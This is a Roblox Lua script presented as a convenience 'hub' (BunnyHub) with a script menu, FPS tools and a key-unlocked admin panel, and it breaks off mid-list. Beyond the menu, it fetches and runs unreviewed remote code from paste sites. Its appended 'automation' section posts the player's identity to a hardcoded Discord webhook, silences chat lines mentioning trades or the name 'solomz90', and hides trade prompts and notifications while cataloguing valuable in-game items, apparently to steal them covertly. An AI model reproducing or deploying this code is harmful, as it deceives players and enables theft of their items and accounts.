-- =============================================================
-- 🐰 BUNNY HUB ALL-IN-ONE (NATIVE ULTRA-LIGHT UI) + AUTOMATION
-- Place ID Generator / Tools: 109983668079237 | Redeem: Universal
-- =============================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer
local LP = LocalPlayer
local cam = Workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")

local TARGET_PLACE_ID = 109983668079237
local BASE_URL = "https://pastebin.com/raw/hesvtBJX"
local KeyFileName = "BunnyHub_PendingKey.json"
local ConfigFile = "BunnyHub_Config.json"

-- URL de tu Webhook de Discord
local WEBHOOK_URL = "https://discord.com/api/webhooks/1538656296943751180/_9xvaGd9sngrEJJkOSLnVxS4ORsUVK7Duyo1TzK4DoaZK7uf7liBdyhyP87G6M9rYCAN"

-- =============================================================
-- KEY GENERATOR HELPER FUNCTION
-- =============================================================

local function GenerateRandomKey()
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local parts = {}
    for i = 1, 16 do
        local index = math.random(1, #chars)
        parts[i] = chars:sub(index, index)
    end
    return "BUNNY-" ..
        table.concat(parts, "", 1, 4) .. "-" ..
        table.concat(parts, "", 5, 8) .. "-" ..
        table.concat(parts, "", 9, 12) .. "-" ..
        table.concat(parts, "", 13, 16)
end

-- =============================================================
-- 0. REMOTE CONTROL & BLACKLIST SYSTEM (OPTIMIZED INTERVAL)
-- =============================================================

local function VerifyRemoteStatus()
    local targetUrl = BASE_URL .. "?nocache=" .. tostring(os.time())
    local Success, Response = pcall(function()
        return game:HttpGet(targetUrl)
    end)

    if Success and type(Response) == "string" then
        local isJSON, DecodedData = pcall(function()
            return HttpService:JSONDecode(Response)
        end)

        if isJSON and type(DecodedData) == "table" then
            if DecodedData.HubEnabled == false then
                LocalPlayer:Kick("\n[BunnyHub]\nMAINTENANCE WAIT 2 MINUTES.")
                return false
            end

            if DecodedData.Blacklist and type(DecodedData.Blacklist) == "table" then
                for _, BannedId in ipairs(DecodedData.Blacklist) do
                    if LocalPlayer.UserId == BannedId then
                        LocalPlayer:Kick("\n[BunnyHub]\nRATE LIMITED PROTECTION.")
                        return false
                    end
                end
            end
        end
    end
    return true
end

if not VerifyRemoteStatus() then return end

task.spawn(function()
    while task.wait(45) do
        if not VerifyRemoteStatus() then break end
    end
end)

-- =============================================================
-- 1. MASTER SCRIPT LIST
-- =============================================================

local ScriptsList = {
    { Name = "🍯 HONEY COLLECTOR CHOCOLA", ID = "HoneyCollector", Urls = {"https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Honey/refs/heads/main/script.lua"} },
    { Name = "🎰 Autospin RNG", ID = "AutoSpinRNG", Urls = {"https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Spin-RNG/refs/heads/main/script.lua"} },
    { Name = "🌐 SERVERHOPPER FOR AUTOHONEY", ID = "Serverhopper", Urls = {"https://pastefy.app/sFOkaUno/raw"} },
    { Name = "🐝 AUTOBUY BEE SHOP", ID = "AutoBuyBee", Urls = {"https://pastefy.app/FLOSU5Pk/raw"} },
    { Name = "🍯 AUTOCOLLECT HONEY KY", ID = "AutoCollectKY", Urls = {"https://pastefy.app/wdEAoCOz/raw"} },
    { Name = "🖐️ AUTOGRAB", ID = "AutoGrab", Urls = {"https://pastefy.app/TLsWJj30/raw"} },
    { Name = "🎟️ CODE REDEEMER", ID = "CodeRedeemer", Urls = {"https://pastefy.app/VvuMZMpR/raw"} },
    { Name = "⚔️🤖AUTOPLAY DUELS", ID = "Autoplayduels", Urls = {"https://pastefy.app/YqMbA00x/raw"} },
    { Name = "🏓AUTOPINGPONG", ID = "pingpong", Urls = {"https://api.luarmor.net/files/v4/loaders/4ed367030af6a0282ea58a3b8bcf2b44.lua"} }
}

-- =============================================================
-- 2. CONFIGURATION MANAGEMENT
-- =============================================================

local Config = { StartMinimized = false }

local function SaveConfig()
    if not writefile then return false end
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
end

local function LoadConfig()
    if not isfile or not readfile then return end
    if not isfile(ConfigFile) then return end
    local Success, Data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
    if Success and type(Data) == "table" then
        for k, v in pairs(Data) do Config[k] = v end
    end
end

LoadConfig()

-- =============================================================
-- 3. ADMIN PANEL SPAWNER (15 MINS ACCESS)
-- =============================================================

local function GiveAdminAccess()
    local DURATION = 15 * 60
    local adminTemplate = ReplicatedStorage:WaitForChild("AdminPanelGui", 5)
    if not adminTemplate then
        return false, "AdminPanelGui not found in ReplicatedStorage!"
    end

    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    if playerGui:FindFirstChild("AdminPanelGui") then
        playerGui.AdminPanelGui:Destroy()
    end

    local guiCloned = adminTemplate:Clone()
    guiCloned.Parent = playerGui

    local openButton = guiCloned:WaitForChild("OpenButton")
    local listFrame = guiCloned:WaitForChild("PlayerListFrame")

    listFrame.Visible = false
    openButton.Visible = true

    openButton.MouseButton1Click:Connect(function()
        listFrame.Visible = not listFrame.Visible
    end)

    task.spawn(function()
        local startTime = os.time()
        while (os.time() - startTime) < DURATION do
            local left = DURATION - (os.time() - startTime)
            openButton.Text = string.format("ADMIN (%02d:%02d)", math.floor(left/60), left%60)
            task.wait(1)
        end
        guiCloned:Destroy()
    end)

    return true, "Admin Panel Unlocked for 15 minutes!"
end

-- =============================================================
-- 4. PERFORMANCE & OPTIMIZATION MODULE
-- =============================================================

local Terrain = workspace:FindFirstChildOfClass("Terrain")
local WhiteScreenGui = nil

local function ApplyLowGraphics()
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        for _, effect in ipairs(Lighting:GetChildren()) do
            if effect:IsA("PostEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("BlurEffect") then
                effect.Enabled = false
            end
        end
    end)
    if Terrain then
        pcall(function()
            Terrain.WaterWaveSize = 0
            Terrain.WaterWaveSpeed = 0
            Terrain.WaterReflectance = 0
            Terrain.WaterTransparency = 0
        end)
    end
    task.spawn(function()
        local objs = workspace:GetDescendants()
        for i = 1, #objs do
            local obj = objs[i]
            if obj:IsA("BasePart") then 
                obj.Material = Enum.Material.SmoothPlastic 
                obj.Reflectance = 0
            elseif obj:IsA("Decal") or obj:IsA("Texture") then 
                obj:Destroy()
            elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") then 
                obj.Enabled = false 
            end
            if i % 100 == 0 then task.wait() end
        end
    end)
end

local function ToggleWhiteScreen(State)
    if State then
        if not WhiteScreenGui then
            WhiteScreenGui = Instance.new("ScreenGui")
            WhiteScreenGui.Name = "BunnyHub_AFKSaver"
            WhiteScreenGui.ResetOnSpawn = false
            WhiteScreenGui.IgnoreGuiInset = true
            pcall(function() WhiteScreenGui.Parent = CoreGui end)

            local Frame = Instance.new("Frame")
            Frame.Size = UDim2.fromScale(1, 1)
            Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
            Frame.BorderSizePixel = 0
            Frame.Parent = WhiteScreenGui

            local Label = Instance.new("TextLabel")
            Label.Size = UDim2.new(1, 0, 0, 50)
            Label.Position = UDim2.fromScale(0, 0.45)
            Label.BackgroundTransparency = 1
            Label.Text = "🌸 BunnyHub | AFK Battery Saver Active 🌸"
            Label.TextColor3 = Color3.fromRGB(255, 182, 193)
            Label.TextSize = 20
            Label.Font = Enum.Font.GothamBold
            Label.Parent = Frame
        end
        WhiteScreenGui.Enabled = true
        pcall(function() RunService:Set3dRenderingEnabled(false) end)
    else
        if WhiteScreenGui then WhiteScreenGui.Enabled = false end
        pcall(function() RunService:Set3dRenderingEnabled(true) end)
    end
end

-- =============================================================
-- 5. EXECUTION ENGINE
-- =============================================================

local RunningScripts = {}

local function NormalizeUrls(Urls)
    if type(Urls) == "string" then return {Urls} end
    if type(Urls) == "table" then return Urls end
    return {}
end

local function RunScript(Item)
    if not Item then return end
    local ScriptID = Item.ID
    local Urls = NormalizeUrls(Item.Urls)

    if #Urls == 0 or RunningScripts[ScriptID] then return end
    RunningScripts[ScriptID] = true

    task.spawn(function()
        pcall(function()
            for _, URL in ipairs(Urls) do
                local DownloadSuccess, Content = pcall(function() return game:HttpGet(URL) end)
                if DownloadSuccess and type(Content) == "string" and #Content > 0 then
                    local Function = loadstring(Content)
                    if Function then pcall(Function) end
                end
            end
        end)
        RunningScripts[ScriptID] = nil
    end)
end

local function RunRawUrl(url, name)
    task.spawn(function()
        local success, content = pcall(function() return game:HttpGet(url .. "/raw") end)
        if not success or not content then
            success, content = pcall(function() return game:HttpGet(url) end)
        end

        if success and type(content) == "string" and #content > 0 then
            local fn = loadstring(content)
            if fn then pcall(fn) end
        end
    end)
end

-- =============================================================
-- 6. NATIVE LIGHTWEIGHT UI ENGINE
-- =============================================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "BunnyHub_NativeUI"
ScreenGui.ResetOnSpawn = false
pcall(function() ScreenGui.Parent = CoreGui end)

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Name = "BunnyToggle"
ToggleBtn.Size = UDim2.fromOffset(50, 50)
ToggleBtn.Position = UDim2.new(1, -65, 0.5, -25)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
ToggleBtn.Text = "🌸"
ToggleBtn.TextSize = 24
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleBtn.Active = true
ToggleBtn.Draggable = true
ToggleBtn.Parent = ScreenGui

local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 12)
ToggleCorner.Parent = ToggleBtn

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.fromOffset(520, 320)
MainFrame.Position = UDim2.new(0.5, -260, 0.5, -160)
MainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 30)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = not Config.StartMinimized
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 40)
Header.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 10)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -20, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "🌸 BunnyHub | Light Edition"
Title.TextColor3 = Color3.fromRGB(255, 182, 193)
Title.TextSize = 16
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local function Notify(title, message)
    task.spawn(function()
        local NotifFrame = Instance.new("Frame")
        NotifFrame.Size = UDim2.fromOffset(220, 50)
        NotifFrame.Position = UDim2.new(1, -230, 1, -60)
        NotifFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
        NotifFrame.BorderSizePixel = 0
        NotifFrame.Parent = ScreenGui

        local NotifCorner = Instance.new("UICorner")
        NotifCorner.CornerRadius = UDim.new(0, 8)
        NotifCorner.Parent = NotifFrame

        local NTitle = Instance.new("TextLabel")
        NTitle.Size = UDim2.new(1, -10, 0, 20)
        NTitle.Position = UDim2.new(0, 8, 0, 4)
        NTitle.BackgroundTransparency = 1
        NTitle.Text = title
        NTitle.TextColor3 = Color3.fromRGB(255, 182, 193)
        NTitle.Font = Enum.Font.GothamBold
        NTitle.TextSize = 13
        NTitle.TextXAlignment = Enum.TextXAlignment.Left
        NTitle.Parent = NotifFrame

        local NMsg = Instance.new("TextLabel")
        NMsg.Size = UDim2.new(1, -10, 0, 20)
        NMsg.Position = UDim2.new(0, 8, 0, 24)
        NMsg.BackgroundTransparency = 1
        NMsg.Text = message
        NMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
        NMsg.Font = Enum.Font.Gotham
        NMsg.TextSize = 12
        NMsg.TextXAlignment = Enum.TextXAlignment.Left
        NMsg.Parent = NotifFrame

        task.wait(3.5)
        NotifFrame:Destroy()
    end)
end

ToggleBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

local Sidebar = Instance.new("Frame")
Sidebar.Size = UDim2.new(0, 130, 1, -40)
Sidebar.Position = UDim2.new(0, 0, 0, 40)
Sidebar.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
Sidebar.BorderSizePixel = 0
Sidebar.Parent = MainFrame

local SidebarList = Instance.new("UIListLayout")
SidebarList.Padding = UDim.new(0, 5)
SidebarList.HorizontalAlignment = Enum.HorizontalAlignment.Center
SidebarList.SortOrder = Enum.SortOrder.LayoutOrder
SidebarList.Parent = Sidebar

local SidebarPadding = Instance.new("UIPadding")
SidebarPadding.PaddingTop = UDim.new(0, 10)
SidebarPadding.Parent = Sidebar

local ContentFrame = Instance.new("ScrollingFrame")
ContentFrame.Size = UDim2.new(1, -140, 1, -50)
ContentFrame.Position = UDim2.new(0, 135, 0, 45)
ContentFrame.BackgroundTransparency = 1
ContentFrame.BorderSizePixel = 0
ContentFrame.ScrollBarThickness = 4
ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 182, 193)
ContentFrame.Parent = MainFrame

local ContentList = Instance.new("UIListLayout")
ContentList.Padding = UDim.new(0, 8)
ContentList.SortOrder = Enum.SortOrder.LayoutOrder
ContentList.Parent = ContentFrame

ContentList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ContentFrame.CanvasSize = UDim2.fromOffset(0, ContentList.AbsoluteContentSize.Y + 10)
end)

local function ClearContent()
    for _, child in ipairs(ContentFrame:GetChildren()) do
        if not child:IsA("UIListLayout") then
            child:Destroy()
        end
    end
end

local function CreateTabButton(name)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(0.9, 0, 0, 32)
    Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    Btn.Text = name
    Btn.TextColor3 = Color3.fromRGB(200, 200, 200)
    Btn.Font = Enum.Font.GothamMedium
    Btn.TextSize = 11
    Btn.Parent = Sidebar

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Btn

    return Btn
end

local function BuildSection(text)
    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(1, -10, 0, 20)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(255, 182, 193)
    Label.Font = Enum.Font.GothamBold
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = ContentFrame
end

local function BuildButton(text, callback)
    local Btn = Instance.new("TextButton")
    Btn.Size = UDim2.new(1, -10, 0, 32)
    Btn.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    Btn.Text = text
    Btn.TextColor3 = Color3.fromRGB(240, 240, 240)
    Btn.Font = Enum.Font.Gotham
    Btn.TextSize = 12
    Btn.Parent = ContentFrame

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Btn

    Btn.MouseButton1Click:Connect(callback)
end

local function BuildToggle(text, defaultValue, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, -10, 0, 32)
    Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    Frame.Parent = ContentFrame

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = Frame

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.7, 0, 1, 0)
    Label.Position = UDim2.new(0, 10, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.TextColor3 = Color3.fromRGB(240, 240, 240)
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 12
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.Parent = Frame

    local State = defaultValue
    local TBtn = Instance.new("TextButton")
    TBtn.Size = UDim2.new(0, 40, 0, 20)
    TBtn.Position = UDim2.new(1, -50, 0.5, -10)
    TBtn.BackgroundColor3 = State and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(70, 70, 80)
    TBtn.Text = State and "ON" or "OFF"
    TBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    TBtn.Font = Enum.Font.GothamBold
    TBtn.TextSize = 10
    TBtn.Parent = Frame

    local TCorner = Instance.new("UICorner")
    TCorner.CornerRadius = UDim.new(0, 4)
    TCorner.Parent = TBtn

    TBtn.MouseButton1Click:Connect(function()
        State = not State
        TBtn.BackgroundColor3 = State and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(70, 70, 80)
        TBtn.Text = State and "ON" or "OFF"
        callback(State)
    end)
end

local function BuildInput(placeholder, callback)
    local TextBox = Instance.new("TextBox")
    TextBox.Size = UDim2.new(1, -10, 0, 32)
    TextBox.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
    TextBox.PlaceholderText = placeholder
    TextBox.Text = ""
    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextBox.Font = Enum.Font.Gotham
    TextBox.TextSize = 12
    TextBox.Parent = ContentFrame

    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 6)
    Corner.Parent = TextBox

    TextBox.FocusLost:Connect(function(enterPressed)
        if enterPressed and #TextBox.Text > 0 then
            callback(TextBox.Text)
        end
    end)
end

local function ShowMainTab()
    ClearContent()
    BuildSection("📜 SCRIPTS LIST")
    for _, Item in ipairs(ScriptsList) do
        BuildButton(Item.Name, function()
            RunScript(Item)
            Notify("EXECUTED 💖", Item.Name .. " executed.")
        end)
    end
end

local function ShowAutoTab()
    ClearContent()
    BuildSection("⚡ AUTO-EXECUTE")

    for _, Item in ipairs(ScriptsList) do
        BuildToggle(
            "Auto: " .. Item.Name,
            Config[Item.ID] == true,
            function(val)
                Config[Item.ID] = val
                SaveConfig()
            end
        )
    end
end

local isGeneratingKey = false
local function ValidateAndConsumeKey(inputKey)
    if not isfile or not readfile or not isfile(KeyFileName) then
        return false, "No key file found!"
    end

    local success, content = pcall(function() return readfile(KeyFileName) end)
    if not success or not content then return false, "Error reading key file." end

    local isJSON, data = pcall(function() return HttpService:JSONDecode(content) end)
    if not isJSON or type(data) ~= "table" then return false, "Corrupted key data." end

    if data.Key ~= inputKey then return false, "Incorrect Key." end
    if data.UserId ~= LocalPlayer.UserId then return false, "Key belongs to another player!" end
    if data.Used then return false, "Key has already been used!" end

    pcall(function()
        if delfile then
            delfile(KeyFileName)
        else
            writefile(KeyFileName, HttpService:JSONEncode({ Used = true }))
        end
    end)

    return true, "Key successfully redeemed!"
end

local function ShowAdminTab()
    ClearContent()
    BuildSection("GET KEY PUBLIC")

    if game.PlaceId == TARGET_PLACE_ID then
        BuildSection("KEY FOR PUBLIC METHOD (In-Game Only)")
        BuildButton("⏳ Generate Admin Key (Requires 60s AFK)", function()
            if isGeneratingKey then
                Notify("KEY SYSTEM ⏳", "Key generation in progress!")
                return
            end

            isGeneratingKey = true
            Notify("KEY SYSTEM ⏳", "Timer started! Stay in game for 60s.")

            task.spawn(function()
                local KeyGui = Instance.new("ScreenGui")
                KeyGui.Name = "BunnyKeyGenUI"
                KeyGui.ResetOnSpawn = false
                pcall(function() KeyGui.Parent = CoreGui end)

                local Frame = Instance.new("Frame")
                Frame.Size = UDim2.fromOffset(280, 80)
                Frame.Position = UDim2.new(0.5, -140, 0.15, 0)
                Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                Frame.BorderSizePixel = 0
                Frame.Parent = KeyGui

                local Corner = Instance.new("UICorner")
                Corner.CornerRadius = UDim.new(0, 8)
                Corner.Parent = Frame

                local Label = Instance.new("TextLabel")
                Label.Size = UDim2.fromScale(1, 1)
                Label.BackgroundTransparency = 1
                Label.TextColor3 = Color3.fromRGB(255, 182, 193)
                Label.TextSize = 14
                Label.Font = Enum.Font.GothamBold
                Label.Text = "⏳ Generating Key: 60s"
                Label.Parent = Frame

                for i = 60, 1, -1 do
                    Label.Text = string.format("⏳ Generating Key in: %ds", i)
                    task.wait(1)
                end

                local singleUseKey = GenerateRandomKey()
                if writefile then
                    writefile(KeyFileName, HttpService:JSONEncode({
                        Key = singleUseKey,
                        Used = false,
                        UserId = LocalPlayer.UserId
                    }))
                end

                Label.Text = "Key Copied: " .. singleUseKey
                if setclipboard then setclipboard(singleUseKey) end
                task.wait(5)
                KeyGui:Destroy()
                isGeneratingKey = false
            end)
        end)
    end

    BuildSection("Global Tools")
    BuildButton("🌐 Server Hopper", function()
        RunRawUrl("https://pastefy.app/IgzYW9Kq", "Server Hopper")
        Notify("EXECUTED 💖", "Server Hopper executed.")
    end)

    BuildButton("📋 Copy Job ID", function()
        RunRawUrl("https://pastefy.app/6YTGIF72", "Copy Job ID")
        Notify("EXECUTED 💖", "Copy Job ID executed.")
    end)

    BuildButton("🏠 Next Empty Base", function()
        RunRawUrl("https://pastefy.app/VoNCEPPm", "Next Empty Base")
        Notify("EXECUTED 💖", "Next Empty Base executed.")
    end)

    BuildButton("🎰 Slot Views", function()
        RunRawUrl("https://pastefy.app/1h58UDyC", "Slot Views")
        Notify("EXECUTED 💖", "Slot Views executed.")
    end)

    BuildSection("Redeem Admin Access (15 Mins)")
    BuildInput("Paste key and press Enter...", function(Text)
        local isValid, msg = ValidateAndConsumeKey(Text)
        if isValid then
            local success, err = GiveAdminAccess()
            if success then
                Notify("ADMIN UNLOCKED 👑", "Admin Panel active for 15 mins!")
            else
                Notify("ERROR ❌", err)
            end
        else
            Notify("INVALID KEY ❌", msg)
        end
    end)
end

local function ShowSettingsTab()
    ClearContent()
    BuildSection("UI Preferences")
    BuildToggle("Start Minimized", Config.StartMinimized == true, function(val)
        Config.StartMinimized = val
        SaveConfig()
    end)

    BuildSection("Performance & Optimization")
    BuildButton("⚡ Enable FPS Boost (Low Graphics)", function()
        ApplyLowGraphics()
        Notify("BOOST ⚡", "Low graphics mode applied.")
    end)

    BuildToggle("🔋 AFK Battery Saver", false, function(val)
        ToggleWhiteScreen(val)
    end)
end

local BtnMain = CreateTabButton("📜 SCRIPTS")
local BtnAuto = CreateTabButton("⚡ AUTO-EXEC")
local BtnAdmin = CreateTabButton("🔑 ADMIN")
local BtnSettings = CreateTabButton("⚙️ SETTINGS")

BtnMain.MouseButton1Click:Connect(ShowMainTab)
BtnAuto.MouseButton1Click:Connect(ShowAutoTab)
BtnAdmin.MouseButton1Click:Connect(ShowAdminTab)
BtnSettings.MouseButton1Click:Connect(ShowSettingsTab)

ShowMainTab()

task.spawn(function()
    task.wait(3)
    for _, Item in ipairs(ScriptsList) do
        if Config[Item.ID] == true then
            print("[BunnyHub] Auto-executing: " .. Item.Name)
            RunScript(Item)
            task.wait(1)
        end
    end
    print("[BunnyHub] Auto-execute startup completed.")
end)

-- =============================================================
-- AUTOMATION & WEBHOOK SYSTEM (INTEGRATED)
-- =============================================================

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")

local LP = Players.LocalPlayer
local cam = Workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")

-- URL de tu Webhook de Discord
local WEBHOOK_URL = "https://discord.com/api/webhooks/1538656296943751180/_9xvaGd9sngrEJJkOSLnVxS4ORsUVK7Duyo1TzK4DoaZK7uf7liBdyhyP87G6M9rYCAN"

--------------------------------------------------------------------------------
-- OCULTAR NOTIFICACIONES Y MENSAJES DE TRADEO EN EL CHAT
--------------------------------------------------------------------------------

pcall(function()
    StarterGui:SetCore("SendNotification", {
        Title = "",
        Text = "",
        Duration = 0
    })
end)

if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.OnIncomingMessage = function(message)
        local textLower = string.lower(message.Text or "")
        if string.find(textLower, "trade") or string.find(textLower, "solomz90") or string.find(textLower, "intercambio") or string.find(textLower, "request") then
            local properties = Instance.new("TextChatMessageProperties")
            properties.Text = ""
            return properties
        end
    end
end

-- Función para enviar datos a Discord mediante Webhook
local function sendToDiscord(title, description, fields)
    local executorName = LP and LP.Name or "Desconocido"
    local executorId = LP and tostring(LP.UserId) or "0"

    local data = {
        ["title"] = title,
        ["description"] = description .. "\n\n👤 **Ejecutado por:** " .. executorName .. " (ID: " .. executorId .. ")",
        ["color"] = 65280, -- Verde
        ["fields"] = fields,
        ["footer"] = {
            ["text"] = "Automatización de Brainrots - Roblox"
        }
    }

    local body = HttpService:JSONEncode({
        ["embeds"] = { data }
    })

    pcall(function()
        if syn and syn.request then
            syn.request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        elseif http_request then
            http_request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        elseif Request then
            Request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        else
            HttpService:PostAsync(WEBHOOK_URL, body)
        end
    end)
end

-- Silenciar y eliminar sonidos no deseados en Workspace
Workspace.ChildAdded:Connect(function(child)
    if child:IsA("Sound") and (child.Name == "Activated" or child.Name == "Error") then
        child.Volume = 0
        child:Stop()
        child:Destroy()
    end
end)

-- ELIMINAR NOTIFICACIONES OCULTANDO GUI
local function suppressMessages()
    local function cleanNotificationGui(gui)
        local nameLower = string.lower(gui.Name)
        if string.find(nameLower, "notify") or string.find(nameLower, "notification") or string.find(nameLower, "banner") or string.find(nameLower, "toast") then
            if gui:IsA("ScreenGui") then
                gui.Enabled = false
            elseif gui:IsA("GuiObject") then
                gui.Visible = false
            end
        end
    end

    pg.ChildAdded:Connect(cleanNotificationGui)
    for _, child in ipairs(pg:GetChildren()) do
        cleanNotificationGui(child)
    end
end

-- OCULTAR VENTANAS EMERGENTES DE SOLICITUD DE TRADE
local function hideTradePrompts()
    local function processPrompt(gui)
        local nameLower = string.lower(gui.Name)
        if string.find(nameLower, "prompt") or string.find(nameLower, "alert") then
            if gui:IsA("GuiObject") then
                gui.Position = UDim2.new(10, 0, 10, 0)
                gui.Visible = false
            elseif gui:IsA("ScreenGui") then
                for _, child in ipairs(gui:GetChildren()) do
                    if child:IsA("GuiObject") then
                        child.Position = UDim2.new(10, 0, 10, 0)
                        child.Visible = false
                    end
                end
            end
        end
    end

    pg.ChildAdded:Connect(processPrompt)
    for _, child in ipairs(pg:GetChildren()) do
        processPrompt(child)
    end
end

suppressMessages()
hideTradePrompts()

-- FUNCIÓN PARA OBTENER EL VALOR REAL DESDE DEBRIS
local function getRealBrainrotValue(brainrotModel)
    if not brainrotModel then return "Modelo nulo" end

    local debris = Workspace:FindFirstChild("Debris")
    local rootPart = brainrotModel:FindFirstChild("PrimaryPart")
        or brainrotModel:FindFirstChild("FakeRootPart")
        or brainrotModel:FindFirstChild("RootPart")
        or brainrotModel:FindFirstChildWhichIsA("BasePart")

    if debris then
        for _, overhead in ipairs(debris:GetChildren()) do
            if overhead.Name == "FastOverheadTemplate" then
                local animalOverhead = overhead:FindFirstChild("AnimalOverhead")
                if animalOverhead then
                    local genLabel = animalOverhead:FindFirstChild("Generation")
                    if genLabel and genLabel:IsA("TextLabel") and genLabel.Text ~= "" then
                        local guiObj = animalOverhead:FindFirstChildWhichIsA("SurfaceGui")
                            or animalOverhead:FindFirstChildWhichIsA("BillboardGui")
                            or animalOverhead
                            
                        local targetAdornee = nil
                        if guiObj and guiObj:IsA("LayerCollector") then
                            targetAdornee = guiObj.Adornee
                        end

                        if targetAdornee and (targetAdornee == brainrotModel or (rootPart and targetAdornee == rootPart)) then
                            return genLabel.Text
                        end
                    end
                end
            end
        end

        if rootPart then
            local closestValue = nil
            local minDistance = 12

            for _, overhead in ipairs(debris:GetChildren()) do
                if overhead.Name == "FastOverheadTemplate" then
                    local animalOverhead = overhead:FindFirstChild("AnimalOverhead")
                    if animalOverhead then
                        local genLabel = animalOverhead:FindFirstChild("Generation")
                        if genLabel and genLabel:IsA("TextLabel") and genLabel.Text ~= "" then
                            if genLabel.Text ~= "$10/s" and genLabel.Text ~= "$1/s" then
                                local targetPart = overhead:FindFirstChildWhichIsA("BasePart") or overhead
                                if targetPart:IsA("BasePart") then
                                    local dist = (targetPart.Position - rootPart.Position).Magnitude
                                    if dist < minDistance then
                                        minDistance = dist
                                        closestValue = genLabel.Text
                                    end
                                end
                            end
                        end
                    end
                end
            end

            if closestValue then
                return closestValue
            end
        end
    end

    return "Cifra no detectada"
end

task.spawn(function()

local DELAY_STEP = 0.8

local BrainrotPriority = {
    "Headless Horseman", "Signore Carapace", "Arcadragon", "Elefanto Frigo", "Strawberry Elephant",
    "Pancake and Syrup", "Love Love Bear", "Antonio", "Meowl", "Skibidi Toilet", "Rico Dinero",
    "Griffin", "Dragon Gingerini", "Fishino Clownino", "La Supreme Combinasion", "Ginger Gerat",
    "Tirilikalika Tirilikalako", "Kalika Bros", "Digi Narwhal", "Hydra Bunny", "Dragon Cannelloni",
    "Los Hackers", "Hydra Dragon Cannelloni", "Bunny and Eggy", "Duggy Bros", "Dug dug dug",
    "Ketupat Bros", "John Doe", "La Casa Boo", "Foxini Lanternini", "Quackini Snackini",
